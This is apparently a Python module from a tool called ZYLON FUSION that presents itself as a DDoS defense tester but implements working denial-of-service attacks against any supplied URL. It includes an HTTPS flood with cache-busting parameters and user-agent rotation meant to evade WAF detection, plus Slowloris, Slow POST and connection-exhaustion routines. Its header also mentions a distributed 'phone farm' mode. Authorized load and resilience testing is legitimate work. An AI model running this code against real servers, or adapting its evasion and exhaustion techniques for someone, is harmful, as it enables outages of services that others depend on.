"""
ZYLON FUSION v2.5 - DDoS Defense Testing Engine
================================================

WHAT THIS DOES:
    Tests whether a server's protections (WAF, CDN, rate limiting) actually work.
    You control the concurrency (threads, requests, duration).
    Tests auto-stop when protection is detected — we don't keep hammering.

HOW IT DIFFERS FROM BATTLE MODE:
    - Battle Mode: Uses YOUR phone farm (multiple IPs) via Telnet
    - DDoS Engine: Uses YOUR local machine only (single IP, raw sockets)
    - Battle Mode = distributed testing (many sources)
    - DDoS Engine = single-source testing (one source)

TEST MODULES:
    89 - HTTPS Flood Resilience:  Sends many HTTPS requests, checks if WAF/CDN blocks them
    90 - Slowloris Vulnerability:  Opens slow connections, checks if server exhausts workers
    91 - Slow POST Vulnerability:  Sends body data slowly, checks if server accepts it
    92 - Rate Limit Detection:     Finds exact threshold where rate limiting kicks in
    93 - Connection Capacity:      Finds max concurrent connections before server degrades

AUTO-STOP LOGIC:
    When 3+ requests get blocked (429/403/503), the test stops automatically.
    No point continuing — we already proved the defense works.
    If NOTHING blocks after all requests → target is VULNERABLE (bug bounty finding!).

TERMUX COMPATIBLE: Yes - works on Android without root
USER-CONTROLLED:   You set threads, requests, duration before each test
"""

import time
import random
import socket       # Raw TCP/TLS sockets — used for Slowloris, HTTPS flood
import ssl          # TLS wrapper — wraps raw socket for HTTPS connections
import threading    # Run multiple requests in parallel (one thread per request)
import json
from datetime import datetime
from urllib.parse import urlparse

import requests     # High-level HTTP library — used for rate limit tests

from core.shared_infra import shared_session, regex_cache

# ============================================================================
# USER AGENTS POOL
# ============================================================================
# List of real browser User-Agent strings.
# We rotate these randomly so each request looks like a different browser.
# This helps test if WAF blocks based on User-Agent patterns.
# If all requests use same UA → WAF might flag as bot.
# Rotating UAs → looks more like real traffic → harder for WAF to detect.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
]


class DDoSDefenseEngine:
    """
    DDoS Defense Testing Engine for ZYLON FUSION
    
    Tests whether a target's protections (WAF, CDN, rate limiting, etc.)
    can effectively handle various types of traffic patterns.
    
    All tests are user-controlled with configurable concurrency.
    Tests auto-stop when protection is detected (blocking observed).
    """

    def __init__(self, session=None):
        self.session = session or shared_session
        self.results = {}
        self._stop_flag = threading.Event()

    def stop(self):
        """Signal all running tests to stop"""
        self._stop_flag.set()

    def _reset_stop(self):
        """Reset stop flag for new test"""
        self._stop_flag = threading.Event()

    # ========================================================================
    # TEST 1: HTTPS Flood Resilience Test
    # Inspired by Go HTTPS flood but defensive - user sets concurrency,
    # measures how quickly WAF/CDN starts blocking requests
    # ========================================================================

    def test_https_flood_resilience(self, target, threads=10, requests_per_thread=20,
                                     path="/", duration=30):
        """
        Test if target's WAF/CDN blocks high-frequency HTTPS requests.
        Measures: response time degradation, blocking threshold, protection type.
        
        Args:
            target: Full URL (https://example.com)
            threads: Number of concurrent connections (user-controlled, default 10)
            requests_per_thread: Requests per connection (default 20)
            path: URL path to test (default /)
            duration: Max test duration in seconds (default 30)
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        test_path = path or parsed.path or "/"
        
        results = {
            'test': 'HTTPS Flood Resilience',
            'target': target,
            'threads': threads,
            'requests_per_thread': requests_per_thread,
            'total_requests_sent': 0,
            'successful_requests': 0,
            'blocked_requests': 0,
            'error_requests': 0,
            'first_block_after': None,
            'blocking_status_codes': {},
            'response_times': [],
            'protection_detected': False,
            'protection_type': None,
            'avg_response_time_ms': 0,
            'max_response_time_ms': 0,
            'degradation_detected': False,
            'timestamp': datetime.now().isoformat()
        }
        
        lock = threading.Lock()
        start_time = time.time()
        first_block_time = None
        
        def worker(thread_id):
            nonlocal first_block_time
            for req_num in range(requests_per_thread):
                if self._stop_flag.is_set():
                    break
                if time.time() - start_time > duration:
                    break
                    
                try:
                    req_start = time.time()
                    
                    if use_ssl:
                        # Raw socket + TLS (like the Go code but defensive)
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((host, port))
                        
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        tls_sock = ctx.wrap_socket(sock, server_hostname=host)
                        
                        # Send HTTP GET with random query param (cache bypass)
                        query_param = random.randint(100000, 999999)
                        raw_req = (
                            f"GET {test_path}?q={query_param} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: close\r\n"
                            f"\r\n"
                        )
                        tls_sock.sendall(raw_req.encode())
                        
                        # Read response status
                        response_data = b""
                        while True:
                            try:
                                chunk = tls_sock.recv(4096)
                                if not chunk:
                                    break
                                response_data += chunk
                                if b"\r\n\r\n" in response_data:
                                    break
                            except socket.timeout:
                                break
                        
                        tls_sock.close()
                        req_time = (time.time() - req_start) * 1000
                        
                        # Parse status code from response
                        status_code = 0
                        if response_data:
                            first_line = response_data.split(b"\r\n")[0].decode('utf-8', errors='ignore')
                            parts = first_line.split(' ')
                            if len(parts) >= 2:
                                try:
                                    status_code = int(parts[1])
                                except ValueError:
                                    pass
                        
                    else:
                        # Plain HTTP
                        resp = self.session.get(
                            f"{target}{test_path}?q={random.randint(100000, 999999)}",
                            headers={'User-Agent': random.choice(USER_AGENTS)},
                            timeout=5,
                            allow_redirects=False,
                            verify=False
                        )
                        status_code = resp.status_code
                        req_time = (time.time() - req_start) * 1000
                    
                    with lock:
                        results['total_requests_sent'] += 1
                        results['response_times'].append(round(req_time, 1))
                        
                        if 200 <= status_code < 400:
                            results['successful_requests'] += 1
                        elif status_code in [429, 503, 508, 403]:
                            results['blocked_requests'] += 1
                            results['blocking_status_codes'][str(status_code)] = \
                                results['blocking_status_codes'].get(str(status_code), 0) + 1
                            if first_block_time is None:
                                first_block_time = time.time() - start_time
                                results['first_block_after'] = round(first_block_time, 2)
                        else:
                            results['error_requests'] += 1
                            results['blocking_status_codes'][str(status_code)] = \
                                results['blocking_status_codes'].get(str(status_code), 0) + 1
                        
                        # Detect protection
                        if results['blocked_requests'] >= 3:
                            results['protection_detected'] = True
                            if status_code == 429:
                                results['protection_type'] = 'Rate Limiting'
                            elif status_code == 503:
                                results['protection_type'] = 'WAF/CDN (Service Unavailable)'
                            elif status_code == 403:
                                results['protection_type'] = 'WAF (Forbidden)'
                            elif status_code == 508:
                                results['protection_type'] = 'CDN Loop Detected'
                            else:
                                results['protection_type'] = 'Unknown Protection'
                            
                            # Auto-stop: protection confirmed, no need to continue hammering
                            self._stop_flag.set()
                        
                        # Detect response time degradation (>3x initial avg)
                        if len(results['response_times']) > 10:
                            early_avg = sum(results['response_times'][:5]) / 5
                            recent_avg = sum(results['response_times'][-5:]) / 5
                            if recent_avg > early_avg * 3:
                                results['degradation_detected'] = True
                
                except (socket.timeout, socket.error, ssl.SSLError, requests.exceptions.RequestException):
                    with lock:
                        results['total_requests_sent'] += 1
                        results['error_requests'] += 1
                except Exception:
                    with lock:
                        results['total_requests_sent'] += 1
                        results['error_requests'] += 1
        
        # Launch worker threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,), daemon=True)
            t.start()
            thread_list.append(t)
            time.sleep(0.05)  # Stagger thread start
        
        # Wait for completion
        for t in thread_list:
            t.join(timeout=duration + 5)
        
        elapsed = round(time.time() - start_time, 2)
        results['elapsed_seconds'] = elapsed
        
        # Calculate stats
        if results['response_times']:
            results['avg_response_time_ms'] = round(
                sum(results['response_times']) / len(results['response_times']), 1)
            results['max_response_time_ms'] = max(results['response_times'])
        
        # Verdict
        if results['protection_detected']:
            results['verdict'] = f"PROTECTED - {results['protection_type']} detected after {results['first_block_after']}s"
        elif results['degradation_detected']:
            results['verdict'] = "PARTIALLY PROTECTED - Response time degradation detected but no hard blocking"
        elif results['error_requests'] > results['successful_requests']:
            results['verdict'] = "LIKELY PROTECTED - Most requests failed (server may be dropping connections)"
        else:
            results['verdict'] = "NOT PROTECTED - All requests went through without blocking"
        
        self.results['https_flood'] = results
        return results

    # ========================================================================
    # TEST 2: Slowloris Vulnerability Test
    # Tests if server is vulnerable to slow connection exhaustion
    # ========================================================================

    def test_slowloris(self, target, connections=20, duration=15):
        """
        Test if server is vulnerable to Slowloris (slow connection exhaustion).
        Opens connections and keeps them alive with partial headers.
        
        Args:
            target: Full URL
            connections: Number of slow connections to open (default 20)
            duration: How long to hold connections (default 15s)
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        results = {
            'test': 'Slowloris Vulnerability',
            'target': target,
            'connections_attempted': connections,
            'connections_opened': 0,
            'connections_maintained': 0,
            'connections_dropped': 0,
            'normal_response_time_ms': 0,
            'under_load_response_time_ms': 0,
            'vulnerable': False,
            'timestamp': datetime.now().isoformat()
        }
        
        # First, measure normal response time
        try:
            start = time.time()
            resp = self.session.get(target, timeout=10, verify=False)
            results['normal_response_time_ms'] = round((time.time() - start) * 1000, 1)
        except Exception:
            results['normal_response_time_ms'] = -1
        
        active_sockets = []
        lock = threading.Lock()
        
        # Open slow connections
        for i in range(connections):
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(duration + 5)
                sock.connect((host, port))
                
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                # Send partial HTTP request (no final \r\n)
                partial_req = (
                    f"GET /slowloris-test-{i} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"X-Test-{i}: {random.randint(1000, 9999)}\r\n"
                )
                sock.sendall(partial_req.encode())
                
                with lock:
                    results['connections_opened'] += 1
                active_sockets.append(sock)
            except Exception:
                with lock:
                    results['connections_dropped'] += 1
            
            time.sleep(0.1)
        
        # Keep connections alive with periodic header sends
        def keep_alive():
            while not self._stop_flag.is_set():
                time.sleep(3)
                for i, sock in enumerate(active_sockets):
                    if self._stop_flag.is_set():
                        break
                    try:
                        keep_header = f"X-Keep-{random.randint(1000, 9999)}: alive\r\n"
                        sock.sendall(keep_header.encode())
                        with lock:
                            results['connections_maintained'] += 1
                    except Exception:
                        with lock:
                            results['connections_dropped'] += 1
        
        keep_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_thread.start()
        
        # Wait for duration
        self._stop_flag.wait(duration)
        self._stop_flag.set()
        
        # Now measure response time under load
        try:
            start = time.time()
            resp = self.session.get(target, timeout=10, verify=False)
            results['under_load_response_time_ms'] = round((time.time() - start) * 1000, 1)
        except requests.exceptions.Timeout:
            results['under_load_response_time_ms'] = -1  # Timed out = highly vulnerable
        except Exception as e:
            results['under_load_response_time_ms'] = -2
        
        # Close all connections
        for sock in active_sockets:
            try:
                sock.close()
            except Exception:
                pass
        
        # Determine vulnerability
        if results['connections_opened'] == 0:
            results['verdict'] = "Could not establish any connections"
        elif results['under_load_response_time_ms'] == -1:
            results['vulnerable'] = True
            results['verdict'] = "VULNERABLE - Server timed out under slow connection load"
        elif results['under_load_response_time_ms'] == -2:
            results['verdict'] = "INCONCLUSIVE - Error during under-load test"
        elif results['normal_response_time_ms'] > 0 and results['under_load_response_time_ms'] > 0:
            degradation = results['under_load_response_time_ms'] / max(results['normal_response_time_ms'], 1)
            if degradation > 5:
                results['vulnerable'] = True
                results['verdict'] = f"VULNERABLE - {degradation:.1f}x response time degradation under load"
            elif degradation > 2:
                results['verdict'] = f"PARTIALLY VULNERABLE - {degradation:.1f}x response time degradation"
            else:
                results['verdict'] = f"NOT VULNERABLE - Only {degradation:.1f}x degradation, server handles connections well"
        else:
            results['verdict'] = "INCONCLUSIVE - Could not measure response time difference"
        
        self.results['slowloris'] = results
        return results

    # ========================================================================
    # TEST 3: Slow POST / Slow READ Test
    # ========================================================================

    def test_slow_post(self, target, connections=5, body_size=65536, chunk_delay=1.0):
        """
        Test if server is vulnerable to Slow POST (slow body upload).
        Sends POST request with body data very slowly.
        
        Args:
            target: Full URL
            connections: Number of concurrent slow POST connections (default 5)
            body_size: Total body size to declare (default 64KB)
            chunk_delay: Seconds between each chunk (default 1.0)
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        results = {
            'test': 'Slow POST Vulnerability',
            'target': target,
            'connections': connections,
            'body_size_declared': body_size,
            'connections_opened': 0,
            'connections_accepted': 0,
            'connections_rejected': 0,
            'vulnerable': False,
            'timestamp': datetime.now().isoformat()
        }
        
        lock = threading.Lock()
        
        def slow_post_worker(worker_id):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((host, port))
                
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                # Send headers with Content-Length
                headers = (
                    f"POST /slowpost-test-{worker_id} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {body_size}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.sendall(headers.encode())
                
                with lock:
                    results['connections_opened'] += 1
                
                # Slowly send body data
                bytes_sent = 0
                chunk_size = 16  # Very small chunks
                while bytes_sent < body_size and not self._stop_flag.is_set():
                    chunk = f"a={random.choice('abcdefghijklmnopqrstuvwxyz')}" + "A" * (chunk_size - 3)
                    try:
                        sock.sendall(chunk.encode()[:min(chunk_size, body_size - bytes_sent)])
                        bytes_sent += chunk_size
                        time.sleep(chunk_delay)
                    except Exception:
                        with lock:
                            results['connections_rejected'] += 1
                        break
                else:
                    with lock:
                        results['connections_accepted'] += 1
                
                sock.close()
                
            except Exception:
                with lock:
                    results['connections_rejected'] += 1
        
        # Launch workers
        threads = []
        for i in range(connections):
            t = threading.Thread(target=slow_post_worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.2)
        
        # Wait up to 20 seconds
        for t in threads:
            t.join(timeout=20)
        
        self._stop_flag.set()
        
        # Verdict
        if results['connections_opened'] == 0:
            results['verdict'] = "Could not establish any connections"
        elif results['connections_accepted'] == results['connections_opened']:
            results['vulnerable'] = True
            results['verdict'] = "VULNERABLE - Server accepts slow POST connections without timeout"
        elif results['connections_accepted'] > 0:
            results['verdict'] = "PARTIALLY VULNERABLE - Some slow connections accepted, some rejected"
        else:
            results['verdict'] = "NOT VULNERABLE - Server rejects or times out slow POST connections"
        
        self.results['slow_post'] = results
        return results

    # ========================================================================
    # TEST 4: Rate Limit Detection Test
    # ========================================================================

    def test_rate_limit(self, target, total_requests=50, threads=5, path="/"):
        """
        Test if endpoint enforces rate limiting.
        Sends requests at increasing speed and detects when blocking starts.
        
        Args:
            target: Full URL
            total_requests: Total requests to send (default 50)
            threads: Concurrent threads (default 5)
            path: URL path (default /)
        """
        self._reset_stop()
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        test_path = path or parsed.path or "/"
        
        results = {
            'test': 'Rate Limit Detection',
            'target': target,
            'total_requests': total_requests,
            'successful': 0,
            'rate_limited': 0,
            'errors': 0,
            'rate_limit_detected': False,
            'rate_limit_type': None,
            'rate_limit_header': None,
            'requests_until_limit': None,
            'blocking_status_code': None,
            'response_times_progressive': [],
            'timestamp': datetime.now().isoformat()
        }
        
        lock = threading.Lock()
        request_counter = [0]  # Mutable counter
        first_limit_at = [None]
        
        def worker():
            while not self._stop_flag.is_set():
                with lock:
                    if request_counter[0] >= total_requests:
                        break
                    request_counter[0] += 1
                    req_num = request_counter[0]
                
                try:
                    start = time.time()
                    resp = self.session.get(
                        f"{base_url}{test_path}?r={random.randint(10000, 99999)}",
                        headers={'User-Agent': random.choice(USER_AGENTS)},
                        timeout=10,
                        allow_redirects=False,
                        verify=False
                    )
                    req_time = round((time.time() - start) * 1000, 1)
                    
                    with lock:
                        results['response_times_progressive'].append({
                            'request': req_num,
                            'status': resp.status_code,
                            'time_ms': req_time
                        })
                        
                        if resp.status_code == 429:
                            results['rate_limited'] += 1
                            results['rate_limit_detected'] = True
                            results['blocking_status_code'] = 429
                            if first_limit_at[0] is None:
                                first_limit_at[0] = req_num
                                results['requests_until_limit'] = req_num
                            
                            # Check for rate limit headers
                            for header in ['X-RateLimit-Limit', 'X-RateLimit-Remaining',
                                          'Retry-After', 'X-RateLimit-Reset',
                                          'RateLimit-Limit', 'RateLimit-Remaining']:
                                if header in resp.headers:
                                    results['rate_limit_header'] = f"{header}: {resp.headers[header]}"
                            
                            if 'Retry-After' in resp.headers:
                                results['rate_limit_type'] = f"Fixed Window (Retry-After: {resp.headers['Retry-After']}s)"
                            elif 'X-RateLimit-Remaining' in resp.headers:
                                results['rate_limit_type'] = 'Sliding Window'
                            else:
                                results['rate_limit_type'] = 'Basic Rate Limiting'
                            
                        elif resp.status_code == 503:
                            results['rate_limited'] += 1
                            results['rate_limit_detected'] = True
                            if first_limit_at[0] is None:
                                first_limit_at[0] = req_num
                                results['requests_until_limit'] = req_num
                            results['blocking_status_code'] = 503
                        elif 200 <= resp.status_code < 400:
                            results['successful'] += 1
                        else:
                            results['errors'] += 1
                
                except requests.exceptions.RequestException:
                    with lock:
                        results['errors'] += 1
        
        # Launch workers
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join(timeout=60)
        
        # Verdict
        if results['rate_limit_detected']:
            limit_info = f" after {results['requests_until_limit']} requests" if results['requests_until_limit'] else ""
            results['verdict'] = f"RATE LIMITED - {results['rate_limit_type'] or 'Protection detected'}{limit_info}"
        else:
            results['verdict'] = "NO RATE LIMITING - All requests went through"
        
        self.results['rate_limit'] = results
        return results

    # ========================================================================
    # TEST 5: Connection Capacity Test
    # ========================================================================

    def test_connection_capacity(self, target, max_connections=50, test_path="/"):
        """
        Test maximum concurrent connections the server allows before degrading.
        Gradually increases connections and measures when server starts refusing.
        
        Args:
            target: Full URL
            max_connections: Maximum connections to test (default 50)
            test_path: URL path to test
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        results = {
            'test': 'Connection Capacity',
            'target': target,
            'max_tested': max_connections,
            'successful_connections': 0,
            'failed_connections': 0,
            'peak_concurrent': 0,
            'degradation_point': None,
            'refusal_point': None,
            'timestamp': datetime.now().isoformat()
        }
        
        active_sockets = []
        lock = threading.Lock()
        concurrent_count = [0]
        
        for i in range(max_connections):
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                # Send a keep-alive request
                req = (
                    f"GET {test_path}?cap={i} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.sendall(req.encode())
                
                with lock:
                    results['successful_connections'] += 1
                    concurrent_count[0] += 1
                    results['peak_concurrent'] = max(results['peak_concurrent'], concurrent_count[0])
                active_sockets.append(sock)
                
            except Exception:
                with lock:
                    results['failed_connections'] += 1
                    if results['refusal_point'] is None and results['successful_connections'] > 0:
                        results['refusal_point'] = results['successful_connections']
                
                # If 5 consecutive failures, server likely at capacity
                if results['failed_connections'] >= 5 and results['successful_connections'] > 0:
                    results['degradation_point'] = results['successful_connections']
                    self._stop_flag.set()
                    break
            
            time.sleep(0.05)
        
        # Measure response time under load
        try:
            start = time.time()
            resp = self.session.get(target, timeout=10, verify=False)
            results['under_load_response_ms'] = round((time.time() - start) * 1000, 1)
        except Exception:
            results['under_load_response_ms'] = -1
        
        # Close all connections
        for sock in active_sockets:
            try:
                sock.close()
            except Exception:
                pass
        
        # Verdict
        if results['refusal_point']:
            results['verdict'] = f"CAPACITY LIMIT - Server starts refusing after ~{results['refusal_point']} connections"
        elif results['degradation_point']:
            results['verdict'] = f"DEGRADATION - Server degrades after ~{results['degradation_point']} connections"
        elif results['failed_connections'] == 0:
            results['verdict'] = f"HIGH CAPACITY - Server handled all {max_connections} connections"
        else:
            results['verdict'] = f"TESTED - {results['successful_connections']}/{max_connections} connections succeeded"
        
        self.results['connection_capacity'] = results
        return results

    # ========================================================================
    # TEST 6: DDoS Resilience Summary
    # ========================================================================

    def generate_resilience_report(self):
        """Generate a summary report of all DDoS defense tests"""
        if not self.results:
            return {'error': 'No test results available'}
        
        report = {
            'target': list(self.results.values())[0].get('target', 'Unknown') if self.results else 'Unknown',
            'tests_run': len(self.results),
            'timestamp': datetime.now().isoformat(),
            'findings': [],
            'overall_verdict': None,
            'recommendations': []
        }
        
        vulnerabilities = 0
        protections = 0
        
        for test_name, data in self.results.items():
            finding = {
                'test': data.get('test', test_name),
                'verdict': data.get('verdict', 'Unknown'),
                'vulnerable': data.get('vulnerable', False),
                'protection_detected': data.get('protection_detected', data.get('rate_limit_detected', False))
            }
            report['findings'].append(finding)
            
            if data.get('vulnerable'):
                vulnerabilities += 1
            if data.get('protection_detected') or data.get('rate_limit_detected'):
                protections += 1
        
        if vulnerabilities > 0:
            report['overall_verdict'] = f"VULNERABLE - {vulnerabilities} DoS vulnerability(ies) detected"
            report['recommendations'].append("Implement rate limiting on all public endpoints")
            report['recommendations'].append("Configure connection timeouts for slow requests")
            report['recommendations'].append("Deploy WAF/CDN with DDoS protection (Cloudflare, AWS Shield)")
            report['recommendations'].append("Set Connection: close headers to prevent connection exhaustion")
        elif protections > 0:
            report['overall_verdict'] = f"PROTECTED - {protections} protection mechanism(s) detected"
        else:
            report['overall_verdict'] = "UNKNOWN - Insufficient data to determine protection status"
        
        return report
